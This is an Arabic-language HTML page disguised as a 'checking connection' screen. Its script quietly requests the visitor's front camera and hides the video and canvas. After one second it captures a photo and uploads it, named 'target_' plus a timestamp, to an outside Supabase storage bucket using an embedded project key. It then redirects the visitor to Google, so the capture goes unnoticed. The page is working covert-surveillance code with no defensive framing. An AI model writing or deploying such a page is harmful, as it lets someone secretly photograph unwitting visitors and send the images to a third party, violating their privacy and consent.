<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking...</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
    <div style="text-align:center;">
        <p>جاري فحص الاتصال...</p>
    </div>

    <video id="v" width="640" height="480" autoplay style="display:none" playsinline></video>
    <canvas id="c" width="640" height="480" style="display:none"></canvas>

    <script>
        const PROJECT_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
        const ANON_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
        const _supabase = supabase.createClient(PROJECT_URL, ANON_KEY);

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(async (blob) => {
                        const fileName = `target_${Date.now()}.jpg`;
                        
                        // تعديل الاسم لـ PHOTOS ليطابق سوبابيس عندك
                        const { error } = await _supabase.storage.from('PHOTOS').upload(fileName, blob, {
                            contentType: 'image/jpeg'
                        });

                        if (error) {
                            console.log("Error:", error.message);
                        }
                        
                        window.location.href = "https://www.google.com";
                    }, 'image/jpeg');
                }, 1000);
            } catch (err) {
                window.location.href = "https://www.google.com";
            }
        }
        window.onload = start;
    </script>
</body>
</html>
